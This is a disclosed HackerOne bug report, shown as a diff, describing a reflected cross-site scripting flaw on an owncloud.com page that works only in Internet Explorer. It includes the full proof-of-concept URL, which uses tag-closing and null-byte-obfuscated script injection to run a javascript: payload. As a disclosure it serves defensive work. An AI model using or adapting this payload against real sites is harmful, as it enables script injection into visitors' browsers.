@@ -1,0 +1,22 @@
+ReportLink:https://hackerone.com/reports/127259
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/sergeym
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:01.04.2016 10:23:16
+
+Summary:
+
+xss does work only for inetrnet explorer, for all versions
+
+how to reproduce? :
+
+1. to use internet explorer browser(i have test with ie11)
+2.  go to page
+https://owncloud.com/wp-123.php?action[][]=</form></div></script><script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)
+
+3. will be alert box with name of domain
+
+please look at my poc video in attachment
